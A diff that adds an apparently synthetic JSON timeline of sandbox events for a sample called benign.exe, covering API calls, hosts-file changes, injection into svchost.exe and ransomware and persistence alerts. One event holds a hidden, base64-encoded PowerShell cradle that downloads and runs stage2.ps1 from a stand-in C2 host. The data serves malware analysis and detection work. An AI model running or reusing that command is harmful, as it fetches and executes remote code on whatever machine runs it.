+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": "NtQueryValueKey",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "9c0991a1eab3666c3a612345",
+  "time": "2026-10-13T15:40:34.029Z",
+  "sequence": 212,
+  "lane": "process",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "process-terminated",
+  "module": "capemon",
+  "dataset": "capemon.process",
+  "summary": "explorer.exe terminated",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "c07681c926dbeef8bf10c49a",
+  "time": "2026-10-13T15:40:34.250Z",
+  "sequence": 213,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtClose",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtClose \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtClose",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "f5d95a6785d99eabc13fcb8d",
+  "time": "2026-10-13T15:40:34.648Z",
+  "sequence": 214,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtCreateFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtCreateFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtCreateFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "1eae4ac288751e8f0165cb9f",
+  "time": "2026-10-13T15:40:34.707Z",
+  "sequence": 215,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-value-read",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "cmd.exe read HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"
+ },
+ {
+  "id": "e614d53a67c0396e0bcaae20",
+  "time": "2026-10-13T15:40:34.743Z",
+  "sequence": 216,
+  "lane": "memory",
+  "kind": "event",
+  "category": [
+   "memory"
+  ],
+  "action": "memory-finding",
+  "module": "volatility3",
+  "dataset": "volatility3.malfind",
+  "summary": "malfind: RWX region in cmd.exe at 0x7ff68025f000",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "6e05e64f88cba47f03df06e6",
+  "time": "2026-10-13T15:40:34.791Z",
+  "sequence": 217,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtReadFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtReadFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtReadFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "4fe733f3566c7ee45b2eedef",
+  "time": "2026-10-13T15:40:35.068Z",
+  "sequence": 218,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtClose",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtClose \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtClose",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "f4aedbc3f5af5130d6e240b8",
+  "time": "2026-10-13T15:40:35.122Z",
+  "sequence": 219,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtQueryAttributesFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtQueryAttributesFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtQueryAttributesFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "bfbc6b26cef15f17e88b57e9",
+  "time": "2026-10-13T15:40:35.509Z",
+  "sequence": 220,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "CryptAcquireContextW",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "notepad.exe called CryptAcquireContextW \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": "CryptAcquireContextW",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "6a6b3c3f1f00aa2534044f4b",
+  "time": "2026-10-13T15:40:35.681Z",
+  "sequence": 221,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtReadFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "notepad.exe called NtReadFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": "NtReadFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "69490348ccefc03afe23d80d",
+  "time": "2026-10-13T15:40:35.938Z",
+  "sequence": 222,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "dns-query",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "explorer.exe resolved c2.evil-updates.net \u2192 192.168.150.1",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "192.168.150.1",
+   "port": 53,
+   "domain": "c2.evil-updates.net"
+  },
+  "dns_query": "c2.evil-updates.net",
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "9b718dd1738feb1011c298b3",
+  "time": "2026-10-13T15:40:36.148Z",
+  "sequence": 223,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtCreateFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtCreateFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtCreateFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "f6af097fb33b07c20ba3e500",
+  "time": "2026-10-13T15:40:36.275Z",
+  "sequence": 224,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-written",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "benign.exe wrote C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\\f686aace6942fb7f7ceb231212eef4a4_0a7bd2e3",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\\f686aace6942fb7f7ceb231212eef4a4_0a7bd2e3",
+  "registry_path": null
+ },
+ {
+  "id": "dc7ab79d67a64a005dbde479",
+  "time": "2026-10-13T15:40:36.347Z",
+  "sequence": 225,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtReadFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtReadFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtReadFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "b1ae8301e1dbde44441eb0f6",
+  "time": "2026-10-13T15:40:36.472Z",
+  "sequence": 226,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtClose",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "svchost.exe called NtClose \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": "NtClose",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "2749975db059d987cf832456",
+  "time": "2026-10-13T15:40:36.630Z",
+  "sequence": 227,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "GetTickCount",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called GetTickCount \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "GetTickCount",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "7355e3872ea6ab98ac7a44e7",
+  "time": "2026-10-13T15:40:37.009Z",
+  "sequence": 228,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "dns-query",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "cmd.exe resolved time.windows.com \u2192 192.168.150.1",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "192.168.150.1",
+   "port": 53,
+   "domain": "time.windows.com"
+  },
+  "dns_query": "time.windows.com",
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "b95d18d3ff13db188af8fb79",
+  "time": "2026-10-13T15:40:37.077Z",
+  "sequence": 229,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-created",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "benign.exe created C:\\Windows\\System32\\drivers\\etc\\hosts",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Windows\\System32\\drivers\\etc\\hosts",
+  "registry_path": null
+ },
+ {
+  "id": "4b6363a37a954bae607b4b43",
+  "time": "2026-10-13T15:40:37.390Z",
+  "sequence": 230,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-deleted",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "cmd.exe deleted C:\\Windows\\System32\\drivers\\etc\\hosts",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Windows\\System32\\drivers\\etc\\hosts",
+  "registry_path": null
+ },
+ {
+  "id": "0f51286ee78c5ad7d56c27fe",
+  "time": "2026-10-13T15:40:37.688Z",
+  "sequence": 231,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtCreateFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtCreateFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtCreateFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "820e98548a56446c85a9214e",
+  "time": "2026-10-13T15:40:38.063Z",
+  "sequence": 232,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtQueryValueKey",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "explorer.exe called NtQueryValueKey \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": "NtQueryValueKey",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "39e26023116c8b2d7b340d8a",
+  "time": "2026-10-13T15:40:38.399Z",
+  "sequence": 233,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtQueryAttributesFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtQueryAttributesFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtQueryAttributesFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "c28bafeb94246625fde35e78",
+  "time": "2026-10-13T15:40:38.612Z",
+  "sequence": 234,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtSetInformationFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtSetInformationFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtSetInformationFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "6b5ba2dbbad7c3a5f4aeeb09",
+  "time": "2026-10-13T15:40:38.890Z",
+  "sequence": 235,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtDelayExecution",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtDelayExecution \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtDelayExecution",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "b72cbfedeaa85a312446647e",
+  "time": "2026-10-13T15:40:38.973Z",
+  "sequence": 236,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtClose",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtClose \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtClose",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "cc231741177d8369f08172ea",
+  "time": "2026-10-13T15:40:39.273Z",
+  "sequence": 237,
+  "lane": "process",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "process-created",
+  "module": "capemon",
+  "dataset": "capemon.process",
+  "summary": "cmd.exe started powershell.exe (powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAtAHUAcABkAGEAdABlAHMALgBuAGUAdAAvAHMAdABhAGcAZQAyAC4AcABzADEAIgApADsAIABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBjADIALgBlAHYAaQBsAC0AdQBwAGQAYQB0AGUAcwAuAG4AZQB0AC8AcwB0AGEAZwBlADIALgBwAHMAMQAiACkAOwAgAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQA)",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "971da25fef497559f9b036b8",
+  "time": "2026-10-13T15:40:39.393Z",
+  "sequence": 238,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-created",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "benign.exe created C:\\Users\\Analyst\\AppData\\Local\\Temp\\nested_directory_with_a_long_name\\nested_directory_with_a_long_name\\nested_directory_with_a_long_name\\nested_directory_with_a_long_name\\nested_directory_with_a_long_name\\loader_stage_two.exe",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Users\\Analyst\\AppData\\Local\\Temp\\nested_directory_with_a_long_name\\nested_directory_with_a_long_name\\nested_directory_with_a_long_name\\nested_directory_with_a_long_name\\nested_directory_with_a_long_name\\loader_stage_two.exe",
+  "registry_path": null
+ },
+ {
+  "id": "34b1b38e39ad84dbabf739ef",
+  "time": "2026-10-13T15:40:39.593Z",
+  "sequence": 239,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtOpenProcess",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtOpenProcess on svchost.exe (4412) \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtOpenProcess",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "611bc2672f7a8720927118a7",
+  "time": "2026-10-13T15:40:39.608Z",
+  "sequence": 240,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtAllocateVirtualMemory",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtAllocateVirtualMemory in svchost.exe (4412), 0x2000 bytes RWX",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtAllocateVirtualMemory",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "6fc8aa0f2307285a4b9ca6b4",
+  "time": "2026-10-13T15:40:39.617Z",
+  "sequence": 241,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtWriteVirtualMemory",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtWriteVirtualMemory into svchost.exe (4412), 0x1d4a bytes",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtWriteVirtualMemory",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "0b00f7a8f868e54916df1f73",
+  "time": "2026-10-13T15:40:39.628Z",
+  "sequence": 242,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtCreateThreadEx",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtCreateThreadEx in svchost.exe (4412) \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtCreateThreadEx",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "0090624136bb0fdbc2b65be9",
+  "time": "2026-10-13T15:40:39.668Z",
+  "sequence": 243,
+  "lane": "process",
+  "kind": "alert",
+  "category": [
+   "intrusion_detection"
+  ],
+  "action": "rule-matched",
+  "module": "cape",
+  "dataset": "cape.match",
+  "summary": "Code injection into svchost.exe (4412) with CreateRemoteThread",
+  "severity": "high",
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": "injection_createremotethread",
+  "rule_ruleset": "cape",
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "c78e67c0d4d1b5abd8d8447b",
+  "time": "2026-10-13T15:40:39.728Z",
+  "sequence": 244,
+  "lane": "process",
+  "kind": "alert",
+  "category": [
+   "intrusion_detection"
+  ],
+  "action": "rule-matched",
+  "module": "cape",
+  "dataset": "cape.match",
+  "summary": "Mass file modification: 120 documents rewritten under C:\\Users\\Analyst",
+  "severity": "critical",
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": "ransomware_files",
+  "rule_ruleset": "cape",
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "87aa06ef51908a37e8f43bbb",
+  "time": "2026-10-13T15:40:39.753Z",
+  "sequence": 245,
+  "lane": "process",
+  "kind": "alert",
+  "category": [
+   "intrusion_detection"
+  ],
+  "action": "rule-matched",
+  "module": "cape",
+  "dataset": "cape.match",
+  "summary": "benign.exe installed itself for autorun at Windows startup",
+  "severity": "medium",
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": "persistence_autorun",
+  "rule_ruleset": "cape",
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "a5c67166e6310a985f7ba15e",
+  "time": "2026-10-13T15:40:39.833Z",
+  "sequence": 246,
+  "lane": "process",
+  "kind": "alert",
+  "category": [
+   "intrusion_detection"
+  ],
+  "action": "rule-matched",
+  "module": "sigma",
+  "dataset": "sigma.match",
+  "summary": "benign.exe performed an HTTP request to a rare domain",
+  "severity": "low",
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": "network_http",
+  "rule_ruleset": "sigma",
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "b1244a2b298095b470073f5d",
+  "time": "2026-10-13T15:40:39.866Z",
+  "sequence": 247,
+  "lane": "process",
+  "kind": "alert",
+  "category": [
+   "intrusion_detection"
+  ],
+  "action": "rule-matched",
+  "module": "cape",
+  "dataset": "cape.match",
+  "summary": "Checks the amount of memory in the system",
+  "severity": "info",
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": "antivm_checks_available_memory",
+  "rule_ruleset": "cape",
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "04e65c84a9210f07982d7321",
+  "time": "2026-10-13T15:40:39.886Z",
+  "sequence": 248,
+  "lane": "process",
+  "kind": "alert",
+  "category": [
+   "intrusion_detection"
+  ],
+  "action": "rule-matched",
+  "module": "sigma",
+  "dataset": "sigma.match",
+  "summary": "Process injection followed by mass file modification",
+  "severity": "critical",
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": "process_injection_chain",
+  "rule_ruleset": "sigma",
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "3802b601b05177daca511daf",
+  "time": "2026-10-13T15:40:40.098Z",
+  "sequence": 249,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtDelayExecution",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtDelayExecution \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtDelayExecution",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "9c4cc558ccfc399f69f2494b",
+  "time": "2026-10-13T15:40:40.317Z",
+  "sequence": 250,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtWriteFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtWriteFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtWriteFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ }
+]
